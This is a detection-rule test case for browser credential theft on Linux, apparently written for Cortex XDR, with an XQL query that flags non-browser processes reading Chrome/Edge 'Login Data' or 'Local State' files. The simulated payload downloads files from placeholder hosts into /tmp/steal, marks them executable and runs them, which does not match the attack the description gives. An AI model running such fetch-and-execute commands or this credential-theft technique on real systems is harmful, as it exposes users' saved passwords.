identity.description: An attacker extracts saved browser credentials from Linux systems by copying Chrome/Edge 'Login Data' and 'Local State' files, then uses the AES key to decrypt passwords. Cortex should detect non-browser processes accessing these sensitive paths.

payload.code:
mkdir -p /tmp/steal
wget -O /tmp/steal/chrome_login_data https://example.com/chrome_login_data
wget -O /tmp/steal/chrome_local_state https://192.0.2.10/chrome_local_state
stub chmod +x /tmp/steal/chrome_login_data
stub chmod +x /tmp/steal/chrome_local_state
stub /tmp/steal/chrome_login_data
stub /tmp/steal/chrome_local_state

biocs.name: NonBrowserAccessToLoginData
biocs.description: Detects non-browser processes reading Chrome/Edge Login Data or Local State files
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE_ACCESS
| filter action_file_path contains 'Login Data' or action_file_path contains 'Local State'
| filter actor_process_image_name != 'chrome' and actor_process_image_name != 'firefox' and actor_process_image_name != 'edge'
| filter causality_actor_process_image_name != 'chrome' and causality_actor_process_image_name != 'firefox' and causality_actor_process_image_name != 'edge'
